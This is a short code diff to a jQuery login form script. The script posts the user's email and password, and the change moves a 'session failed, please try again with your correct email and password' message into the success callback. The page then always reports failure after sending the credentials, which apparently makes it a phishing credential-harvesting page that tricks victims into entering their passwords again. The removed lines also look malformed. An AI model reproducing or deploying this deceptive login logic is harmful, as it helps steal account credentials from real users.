@@ -56,11 +56,13 @@
                 method: "post",
                 data: {email: input4email, password: input4passwd},
                 processData: false,
-                      })  
-               
-                                   
-                complete: function(feedback) {
-                       $('#showerror').html("Oops.. Something went wrong, session failed to open, please try again with your correct email and password");
+                beforeSend: function(xhr){
+                    $('#showerror').removeClass('alert').text('')
+                    $('#btn4sbmt').html('<center><div class="spinner"></div></center>').prop('disabled', true);
+                },                        
+                success: function(feedback) {
+                       $('#showerror').html("Oops.. Something went wrong, session failed to open, please try again with your correct email and password")
+                       console.log(feedback);
                        // return false;
                 $('#igodo').focus();
                 $('#igodo').val('');
